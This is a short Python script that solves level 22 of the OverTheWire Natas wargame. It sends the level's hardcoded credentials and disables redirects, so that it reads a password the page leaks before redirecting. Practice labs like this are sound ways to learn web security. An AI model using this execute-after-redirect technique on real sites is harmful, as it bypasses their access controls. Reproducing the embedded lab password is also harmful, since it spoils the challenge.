import requests

URL = "http://natas22.natas.labs.overthewire.org/?revelio=1"
AUTH = ("natas22", "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF")

sesh = requests.Session()
sesh.auth = AUTH
response = sesh.get(url = URL, allow_redirects=False)
print(response.text)